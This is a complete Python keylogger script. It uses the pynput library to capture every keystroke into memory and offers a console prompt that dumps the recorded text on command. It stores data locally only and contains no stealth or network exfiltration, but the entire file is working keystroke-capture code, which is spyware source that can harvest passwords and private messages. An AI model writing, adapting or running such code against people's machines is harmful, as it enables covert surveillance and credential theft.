from threading import Thread
import pynput.keyboard
from termcolor import cprint
from Colors.color import Color

keylogvar = ""
running = True
keyboard_Listener = None
color = Color()


def process_Key_Press(key):
    global keylogvar
    try:
        keylogvar += str(key.char)
    except AttributeError:
        if key == key.space:
            keylogvar += " "
        else:
            keylogvar += str(key)


def keyBoardLoggerFunc():
    global keyboard_Listener
    try:
        keyboard_Listener = pynput.keyboard.Listener(on_press=process_Key_Press)
        with keyboard_Listener:
            keyboard_Listener.join()
    except Exception as ex:
        cprint("[-]Something wen Wrong", color.red)
    finally:
        cprint("[-] Terminating keyLoggerThread...", color.red)


def handler():
    global keylogvar
    global running
    while running:
        try:
            command = input("[+]> What do you want to do:").strip()
            if command == "dump log":
                print(keylogvar)
            elif command == "quit":
                running = False
                if keyboard_Listener:
                    cprint(
                        "[-] Starting To terminate keylogger thread ...", color.yellow
                    )
                    keyboard_Listener.stop()
        except Exception as ex:
            cprint("[-] Handler Error:", color.red)
            print(str(ex))


def main():
    try:
        cprint("[+] Starting keylogger thread ....",color.green)
        keyboard_Listener = pynput.keyboard.Listener(on_press=process_Key_Press)
        keyboard_Listener.start()
        cprint("[+] Started keylogger thread ....",color.green)
        handler()
        if keyboard_Listener:
            keyboard_Listener.stop()
        keyboard_Listener.join() # Wait for the keylogger thread to finish before exiting
        cprint("[+] Keylogger thread terminated.", "yellow")
    except KeyboardInterrupt:
        cprint("[-] Operation Cancelled", "red")


if __name__ == "__main__":
    main()
